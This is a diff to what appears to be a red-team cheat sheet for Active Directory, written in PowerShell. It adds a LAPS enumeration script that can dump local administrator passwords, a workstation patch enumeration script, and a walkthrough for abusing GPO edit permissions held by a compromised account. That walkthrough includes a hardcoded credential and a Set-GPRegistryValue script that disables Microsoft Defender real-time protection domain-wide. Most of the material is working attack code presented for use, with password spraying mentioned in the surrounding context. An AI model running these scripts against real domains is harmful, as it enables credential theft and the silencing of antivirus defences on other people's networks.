@@ -8,6 +8,7 @@
 4. High value AD Computers  
 5. Get the current user running permissions for all objects ACL  
 6. Password Spray single password against list of usernames.  
+7. Abuse Group Policy Edit Permission on GPO.  
 
 >[YouTube Video: Hackers Evade Detection with PowerShell Obfuscation](https://youtu.be/t4rpsFt6n08?si=5T3hOLQl3RghwfsB)  
 >[https://powershellforhackers.com/](https://powershellforhackers.com/)  
@@ -235,6 +236,195 @@ nxc -t 1 smb domaincontroller.domain.internal -u userlist.txt -p password --cont
 
 >Above is nxc command to spray the password of password using list of possible Active Directory user accounts.  
 
+----  
 
+## LAPS Enumeration  
 
+>Local Administrator Password Service, Active Directory PowerShell script get values for all computers with LAPS settings:  
+
+```PowerShell
+Import-Module ActiveDirectory
+
+Get-ADComputer -Filter * -Properties * |
+ForEach-Object {
+    $props = $_.PSObject.Properties |
+        Where-Object { $_.Name -like '*laps*' }
+
+    if ($props) {
+        $expiration = $_.'msLAPS-PasswordExpirationTime'
+        if ($expiration) {
+            try {
+                $readableTime = ([datetime]::FromFileTimeUtc($expiration)).ToString('yyyy-MM-dd HH:mm:ss')
+            } catch {
+                $readableTime = "InvalidTimeFormat"
+            }
+        } else {
+            $readableTime = "NotSet"
+        }
+
+        [PSCustomObject]@{
+            ComputerName          = $_.Name
+            LAPS_Expiration       = $readableTime
+            LAPS_Fields_Extracted = ($props | ForEach-Object { "$($_.Name)=$($_.Value)" }) -join "; "
+        }
+    }
+} | Format-Table -Wrap -AutoSize
+``` 
+
+----  
+
+## Workstation Resource Enumeration  
+
+>Get the memory, cpu and missing security patches for Windows workstation:  
+
+```powershell
+# Ensure script execution is allowed for the current user
+Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser -Force
+ 
+# Get system info
+$serverName = $env:COMPUTERNAME
+$dateTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+ 
+# CPU usage (%)
+$cpuUsage = (Get-Counter '\Processor(_Total)\% Processor Time').CounterSamples.CookedValue
+$cpuUsage = [math]::Round($cpuUsage, 2)
+ 
+# Memory usage (%)
+$mem = Get-CimInstance Win32_OperatingSystem
+$memUsage = [math]::Round((($mem.TotalVisibleMemorySize - $mem.FreePhysicalMemory) / $mem.TotalVisibleMemorySize) * 100, 2)
+ 
+# Operating System Info - systeminfo
+$osName = $mem.Caption
+$osVersion = $mem.Version
+ 
+# Last Installed security windows patch  
+$lastPatch = Get-HotFix | Sort-Object InstalledOn -Descending | Select-Object -First 1
+$lastPatchDate = $lastPatch.InstalledOn
+ 
+# Missing security pathces and Updates outstanding and not Installed
+try {
+    $missingUpdates = (New-Object -ComObject Microsoft.Update.Session).CreateUpdateSearcher().Search("IsInstalled=0").Updates | 
+                      Select-Object -ExpandProperty Title
+} catch {
+    $missingUpdates = @("Unable to retrieve missing updates. Windows Update service may be disabled.")
+}
+ 
+# Print to shell
+Write-Host "Server Name            : $serverName"
+Write-Host "Date & Time            : $dateTime"
+Write-Host "CPU Usage              : $cpuUsage %"
+Write-Host "Memory Usage           : $memUsage %"
+Write-Host "Operating System       : $osName ($osVersion)"
+Write-Host "Last Patch Installed On: $lastPatchDate"
+ 
+# Print missing updates
+Write-Host "Missing Updates        :"
+if ($missingUpdates.Count -eq 0) {
+    Write-Host "  None"
+} else {
+    foreach ($update in $missingUpdates) {
+        Write-Host "  - $update"
+    }
+}
+```  
+
+----  
+
+## GpoEdit Permission Abuse  
+
+>Determine if you can edit Group Policy with user account that is known or compromised.  
+>If that GPO controls Microsoft Defender real-time protection or is set higher level abuse it to disable antivirus protection.  
+
+>If you have control of windows 11 workstation in domain install Group Policy Powershell module,  
+>or add own computer to domain is compromised user can add new computers to the domain.  
+
+```PowerShell
+Add-WindowsCapability -Online -Name Rsat.GroupPolicy.Management.Tools~~~~0.0.1.0
+
+Get-Module -ListAvailable GroupPolicy
+
+Import-Module GroupPolicy
+
+Get-GPO -All | Select-Object DisplayName, Id, CreationTime, ModificationTime, Owner
+
+Get-GPO -All | Out-GridView
+```  
+
+>Run the following script to identify and enumeration group policy delegated permission in Active directory:  
+
+```PowerShell
+Import-Module GroupPolicy
+
+# Get all GPOs
+$gpos = Get-GPO -All
+
+foreach ($gpo in $gpos) {
+    Write-Host "`n========== $($gpo.DisplayName) =========="
+
+    # Get all permissions
+    $permissions = Get-GPPermission -Guid $gpo.Id -All
+
+    foreach ($perm in $permissions) {
+        # Show only permissions relevant to editing or full control
+        if ($perm.Permission -in @("GpoEdit", "GpoEditDeleteModifySecurity")) {
+            $name = $perm.Trustee.Name
+            $sid = $perm.Trustee.Sid.Value
+            $type = $perm.Trustee.Type
+
+            Write-Host "Trustee: $name ($type) - SID: $sid - Permission: $($perm.Permission)"
+        }
+    }
+}
+```  
+
+>Run the above script: `.\list_all_users_edit_GPO_permission.ps1`  
+
+>The output example below shows the user `auser` have `GpoEdit` permissions on the GPO: `Microsoft Defender AD GPO`  
+
+```PowerShell
+========== Default Domain Policy ==========
+Trustee: SYSTEM () - SID: S-1-5-18 - Permission: GpoEditDeleteModifySecurity
+
+========== Microsoft Defender AD GPO ==========
+Trustee: auser () - SID: S-1-5-21-1153563262-525900357-1151977077-1121 - Permission: GpoEdit
+Trustee: Domain Admins () - SID: S-1-5-21-1153563262-525900357-1151977077-512 - Permission: GpoEditDeleteModifySecurity
+Trustee: Enterprise Admins () - SID: S-1-5-21-1153563262-525900357-1151977077-519 - Permission: GpoEditDeleteModifySecurity
+Trustee: SYSTEM () - SID: S-1-5-18 - Permission: GpoEditDeleteModifySecurity
+
+========== Default Domain Controllers Policy ==========
+Trustee: SYSTEM () - SID: S-1-5-18 - Permission: GpoEditDeleteModifySecurity
+
+========== SeImpersonatePrivilege - AUser ==========
+Trustee: Domain Admins () - SID: S-1-5-21-1153563262-525900357-1151977077-512 - Permission: GpoEditDeleteModifySecurity
+Trustee: Enterprise Admins () - SID: S-1-5-21-1153563262-525900357-1151977077-519 - Permission: GpoEditDeleteModifySecurity
+Trustee: SYSTEM () - SID: S-1-5-18 - Permission: GpoEditDeleteModifySecurity
+```  
+
+>Remote connect as the user with the dangerous permissions:   
+
+```PowerShell
+# Prompt: alternatively, store securely rather than plaintext
+$SecurePass = ConvertTo-SecureString "P@ssw0rd" -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential("LAB\auser", $SecurePass)
+```  
+
+Run the following scritp to set the GPO setting and disable Defender antivirus: `C:\tools\turn_off_real-time_protection_defender.ps1`  
+
+```PowerShell
+Import-Module GroupPolicy
+
+Set-GPRegistryValue -Name "Microsoft Defender AD GPO" `
+    -Key "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" `
+    -ValueName "DisableRealtimeMonitoring" `
+    -Type DWord `
+    -Value 1
+
+Write-Host "[+] Successfully set 'Turn off real-time protection' to Enabled."
+```
+
+Run the following scritp to set the GPO setting and disable Defender antivirus: `C:\tools\turn_off_real-time_protection_defender.ps1`  
+
+![GPO_Dangerous_Permission_GpoEdit.png](/images/GPO_Dangerous_Permission_GpoEdit.png)  
+
+----  
 
